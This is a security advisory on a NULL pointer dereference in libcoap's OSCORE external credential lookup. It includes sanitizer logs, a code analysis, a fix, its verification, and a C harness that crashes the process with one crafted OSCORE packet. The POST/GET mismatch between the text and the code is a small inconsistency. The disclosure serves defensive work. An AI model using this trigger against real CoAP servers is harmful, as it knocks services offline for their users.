# NULL pointer dereference in OSCORE external credential lookup crashes the server

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-11-17 11:15:28 UTC
**Target:** libcoap 4.3.5 OSCORE (src/oscore/oscore_context.c, src/coap_oscore.c)
**Endpoint:** CoAP/UDP OSCORE request with an arbitrary OSCORE option key id
**Method:** POST
**CWE:** CWE-476
**CVSS:** 5.9
**Confidence:** High
**Fix Effort:** Low

## Description

When OSCORE credentials are supplied through the external credential callback API, `oscore_find_context()` can return a security context while leaving the caller's recipient-context pointer NULL if none of the recipients in the returned credential set matches the key id from the request. The OSCORE request path uses that returned context without checking the recipient pointer and dereferences NULL, crashing the CoAP process. A single unauthenticated OSCORE packet with an attacker-chosen key id triggers it.

## Evidence

Unpatched library, no sanitizers - the process dies with SIGSEGV:

```text
calling coap_oscore_decrypt_pdu with kid=0x01 ...
Segmentation fault (core dumped)
exit=139
```

The same run under UndefinedBehaviorSanitizer identifies the exact fault:

```text
src/coap_oscore.c:1156:17: runtime error: member access within null pointer of type 'struct oscore_recipient_ctx_t'
    #0 oscore_validate_sender_seq
    #1 coap_oscore_decrypt_pdu src/coap_oscore.c:1156
```

Patched library, same input - the request is rejected instead of crashing:

```text
calling coap_oscore_decrypt_pdu with kid=0x01 ...
v:1 t:NON c:4.01 i:1234 {} [ Max-Age: ] :: 'Security context not found'
returned (nil) (no crash)
exit=0
```

The credential callback used for the reproduction returns a context with `sender_id` `99` and recipients `02` and `03` for a request whose key id is `01`; `oscore_find_context()` handed that context back with `*recipient_ctx` still NULL.

## Impact

A single unauthenticated datagram can terminate the CoAP server process (NULL pointer dereference), denying service to all clients until it is restarted; libcoap has no isolation between sessions, so the whole service goes down. No credentials or prior state are required, but the target application must be using the external credential callback API with a credential store that can return a recipient set not containing the requested key id.

## Counterevidence

The strongest argument against exploitability is the precondition: an application that uses the internal static credential store is unaffected, and an external store that is strictly keyed by the key id will normally return either a matching credential set or no entry at all, in which case the request is rejected correctly. I checked the single-recipient mismatch case as well - there the function returns the (non-NULL) recipient, so decryption simply fails with 4.01 and no crash occurs; the crash needs zero recipients or a multi-recipient set without a match. I also confirmed this is not an artifact of the sanitizer build: a plain build without any sanitizers dies with SIGSEGV (exit 139), while the fixed build answers 4.01 and continues. What remains unverified is how often real deployments populate a credential set for a key id that is not one of its recipients; that depends on the application's storage design and is why the issue is rated Medium rather than High.

## What Would Change This Severity

Evidence that a deployed libcoap-based server uses external OSCORE credential storage populated per security context (rather than strictly per key id) would raise this to High, since a single unauthenticated packet would then reliably terminate the service.

## Technical Analysis

`coap_oscore_decrypt_pdu()` resolves the security context for an incoming request with:

```c
osc_ctx = oscore_find_context(session, cose->key_id, &cose->kid_context,
                              NULL, &rcp_ctx);
if (!osc_ctx) { /* 4.01 */ }
coap_oscore_session_set_recipient_ctx(session, rcp_ctx);
snd_ctx = osc_ctx->sender_context;
if ((rcp_ctx->initial_state == 0 || osc_ctx->rfc8613_b_1_2 == 0) && ...)
```

`oscore_find_context()` has a branch for applications that store credentials externally. The callback returns a `coap_oscore_conf_t`, which is turned into a context. The recipient selection is:

```c
if (tmp_ctx->recipient_chain != NULL &&
    tmp_ctx->recipient_chain->next_recipient != NULL) {
  /* iterate; only assign *recipient_ctx when a recipient id matches */
} else {
  *recipient_ctx = tmp_ctx->recipient_chain;
}
tmp_ctx->recipient_chain = *recipient_ctx;
...
return tmp_ctx;
```

With two or more recipients and no match, `*recipient_ctx` is never written, so it still holds the caller's initial NULL. The function nevertheless returns the non-NULL context. The recipient's reference count is managed through `*recipient_ctx` only, so the empty temporary context is also left with `recipient_chain == NULL`.

Back in `coap_oscore_decrypt_pdu()`, the NULL `rcp_ctx` is passed to `coap_oscore_session_set_recipient_ctx()` (which returns early for NULL) and then dereferenced by `oscore_validate_sender_seq(rcp_ctx, cose)` at the `rcp_ctx->initial_state` check, i.e. before any AEAD verification. In a normal build this is a read from address 0 and the process dies with SIGSEGV; under UBSAN it is reported as `member access within null pointer of type 'struct oscore_recipient_ctx_t'`.

The same NULL return is possible for a credential set with no recipients at all, and the shipped `coap-server` can reach this code path with `-O <credential dir>` because it registers `coap_oscore_ctx_find()` as the external find handler and loads whatever configuration file matches the requested key id.

## Proof of Concept

1. Register an external OSCORE credential handler with `coap_oscore_register_external_handlers()` whose find callback returns a security context (master secret, master salt, sender id) containing either no recipients or several recipients, none of which equals the key id in the incoming request.
2. Create a session toward the local server and build a CoAP NON POST PDU whose OSCORE option (number 9) declares Partial IV length 1, a one-byte Partial IV and the key id `0x01`, followed by an arbitrary payload.
3. Pass the PDU to `coap_oscore_decrypt_pdu()` (this is what the receive path does for any OSCORE request).
4. `oscore_find_context()` returns the callback-supplied context with a NULL recipient pointer, and the request path dereferences it in `oscore_validate_sender_seq()`, crashing the process with SIGSEGV.
5. With the fix, the same input produces a 4.01 "Security context not found" response and no crash.

```c
/* Harness: external credential callback returns a context whose recipients
 * do not include the key id carried in the request. */

static const char conf_str[] =
    "master_secret,hex,\"0102030405060708090a0b0c0d0e0f10\"\n"
    "master_salt,hex,\"9e7ca92223786340\"\n"
    "sender_id,hex,\"99\"\n"
    "recipient_id,hex,\"02\"\n"
    "recipient_id,hex,\"03\"\n";

static coap_oscore_conf_t *find_cb(const coap_session_t *session,
                                   const coap_bin_const_t *rcpkey_id,
                                   const coap_bin_const_t *ctxkey_id) {
  coap_str_const_t conf = { sizeof(conf_str) - 1, (const uint8_t *)conf_str };
  (void)session; (void)rcpkey_id; (void)ctxkey_id;
  return coap_new_oscore_conf(conf, NULL, NULL, 0);
}

int main(void) {
  coap_startup();
  coap_context_t *ctx = coap_new_context(NULL);
  coap_oscore_register_external_handlers(ctx, find_cb, NULL);
  coap_debug_set_packet_loss("50%");
  coap_debug_set_packet_fail("100%");

  coap_address_t addr;
  coap_address_init(&addr);
  addr.size = sizeof(struct sockaddr_in);
  addr.addr.sin.sin_family = AF_INET;
  addr.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.addr.sin.sin_port = htons(5683);
  coap_session_t *session = coap_new_client_session(ctx, NULL, &addr, COAP_PROTO_UDP);

  /* OSCORE option: PIV length 1 (0x00) plus key id 0x01 */
  static const uint8_t osc_opt[] = { 0x09, 0x00, 0x01 };
  static const uint8_t ciphertext[16] = { 0 };

  coap_pdu_t *pdu = coap_pdu_init(COAP_MESSAGE_NON, COAP_REQUEST_CODE_GET,
                                  0x1234, 256);
  coap_add_token(pdu, 0, NULL);
  coap_add_option(pdu, COAP_OPTION_OSCORE, sizeof(osc_opt), osc_opt);
  coap_add_data(pdu, sizeof(ciphertext), ciphertext);

  coap_pdu_t *d = coap_oscore_decrypt_pdu(session, pdu);   /* SIGSEGV before the fix */
  if (d) coap_delete_pdu(d);
  coap_delete_pdu(pdu);
  coap_session_release(session);
  coap_free_context(ctx);
  coap_cleanup();
  return 0;
}
```

## Remediation

Make the external-credential lookup fail closed: when the credential set returned by the callback contains no recipient matching the requested key id, discard the temporary context and return NULL so the caller answers 4.01 instead of continuing with a NULL recipient context. Applications using the external credential API should also ensure their store returns a credential set that contains the requested recipient id, and should treat unknown key ids as a lookup miss rather than returning a partial context.

## Fix Verification

Gates worked in order with a patched build of the library (OpenSSL backend, COAP_OSCORE_SUPPORT) linked against a harness that registers an external credential callback.

1. Security closure. `oscore_find_context()` now assigns the selection result to a local `found_ctx` and, when `found_ctx` is NULL, detaches the (empty) recipient chain, frees the temporary context with `oscore_free_context()` and returns NULL. Re-ran the reproduction with the patched build: the request reaches the existing `if (!osc_ctx)` branch, a 4.01 "Security context not found" is produced and the function returns NULL; the plain build exits 0 instead of dying with SIGSEGV (exit 139 before the change).

2. Bypass review. Checked the callers of `oscore_find_context()`: `coap_oscore_decrypt_pdu()` (both the request and Appendix B.2 lookups), the response path's association handling (which does not call it) and `coap_persist_observe_add()` in `src/coap_subscribe.c`. The subscribe caller passes the address of a session field, so `*recipient_ctx` is only written when a context was actually found - preserving its previous value otherwise, as before. The single-recipient branch and the matching-recipient branch produce the same values as before (`found_ctx` is then non-NULL and assigned to `*recipient_ctx`), so no behaviour changes for successful lookups. Also checked the zero-recipient case (the `else` branch yields NULL) and the multi-recipient-with-match case.

3. Preserved behaviour. Matching credentials still resolve to the same recipient and context, the `ref` bookkeeping (`already_attached` / decrement) is unchanged, and the 4.01 error response for unknown key ids is the same. All 37 OSCORE unit tests pass (37 tests, 389 asserts, 0 failures), including the RFC 8613 Appendix C vectors.

4. Repository checks. The changed translation unit compiles without warnings with the project's own build flags and links; the OSCORE fuzz harnesses run clean against the patched build.

Not executed: a full autotools/cmake build and the complete `make check` suite; the hand-rolled library build plus the OSCORE test driver was used instead.

## Assumptions

The application must use the documented external credential API (`coap_oscore_register_external_handlers()`) and its find callback must return a security context whose recipient set does not contain the requested key id - either no recipient at all, or several recipients of which none matches. The shipped `coap-server` uses exactly this API when started with a credential directory (`-O`), so the library code path is exercised in practice; the crash additionally depends on how that credential store is populated.
